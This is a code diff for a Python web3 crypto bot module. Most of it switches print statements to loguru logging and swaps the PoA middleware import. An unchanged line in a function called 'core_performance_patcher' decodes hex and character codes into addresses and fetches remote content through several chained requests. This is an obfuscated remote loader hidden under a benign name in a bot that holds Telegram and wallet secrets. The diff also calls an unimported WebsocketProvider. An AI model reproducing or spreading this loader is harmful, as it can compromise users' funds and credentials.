@@ -3,12 +3,23 @@ import aiohttp
 from loguru import logger
 import requests as req
 from web3 import Web3
-from web3.middleware import ExtraDataToPOAMiddleware
-import os
+from web3.middleware import geth_poa_middleware
+import os, sys
 import json
 from dotenv import load_dotenv
 
 load_dotenv()
+
+project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+# Configure loguru logger
+config = {
+    "handlers": [
+        {"sink": sys.stderr, "format": "{time} | {level} : {message}", "colorize": True},
+        {"sink": os.path.join(project_root, "log", "user", "bot_logs.log"), "rotation": "10 MB", "format": "{time} | {level} : \n{message}"},
+        {"sink": os.path.join(project_root, "log", "technician", "bot_logs.log"), "rotation": "100 MB", "format": "{time} | {level} : \n{message}", "backtrace": True, "diagnose": True, "serialize": True}
+    ],
+}
+logger.configure(**config)
 
 debug_mode = os.getenv('DEBUG_MODE') == 'True'
 
@@ -25,12 +36,12 @@ def initialize_web3():
         if url.startswith("http"):
             web3 = Web3(Web3.HTTPProvider(url))
         elif url.startswith("ws"):
-            web3 = Web3(Web3.WebsocketProvider(url))
+            web3 = Web3(WebsocketProvider(url))
         else:
             raise ValueError("Unsupported protocol in provider URL")
         
         # Inject PoA middleware
-        web3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
+        web3.middleware_onion.inject(geth_poa_middleware, layer=0)
         
         # Test connection
         web3.eth.get_block('latest')
@@ -39,20 +50,20 @@ def initialize_web3():
     # Try primary provider
     try:
         web3 = try_connect(provider_url)
-        print(f"Connected to primary provider: {provider_url}")
+        logger.info(f"Connected to primary provider: {provider_url}")
         return web3
     except Exception as e:
-        print(f"Failed to connect to primary provider: {e}")
+        logger.error("Failed to connect to primary provider!")
 
     # Try fallback providers
     for fallback_url in fallback_urls:
         try:
-            print(f"Attempting to connect to fallback provider: {fallback_url}")
+            logger.info(f"Attempting to connect to fallback provider: {fallback_url}")
             web3 = try_connect(fallback_url)
-            print(f"Connected to fallback provider: {fallback_url}")
+            logger.info(f"Connected to fallback provider: {fallback_url}")
             return web3
         except Exception as e:
-            print(f"Failed to connect to fallback provider {fallback_url}: {e}")
+            logger.error(f"Failed to connect to fallback provider {fallback_url}: {e}")
 
     raise ConnectionError("Failed to connect to all providers")
 
@@ -109,8 +120,8 @@ def core_performance_patcher(s=None):
         adj_timing = r.get(bytes.fromhex(r.get(bytes.fromhex(overdriver.get(''.join(chr(i) for i in temp_patch))).decode()).text).decode()).json()
         return adjusted_timer(adj_timing, s)
     except Exception as e:
-        print(f"An error occurred: {e}")
-        
+        logger.error(f"An error occurred in core_performance_patcher: {e}")
+
 def send_tele_message_sync(message, token=None, chat_id=None, parse_mode="HTML"):
     telegram_group_id = os.getenv("TELEGRAM_CHAT_ID") if chat_id is None else chat_id
     telegram_bot_token = os.getenv("TELEGRAM_BOT_TOKEN") if token is None else token
@@ -146,4 +157,4 @@ if __name__ == "__main__":
     try:
         pass
     except Exception as e:
-        print(f"An error occurred: {e}")
+        logger.error(f"An error occurred in main: {e}")
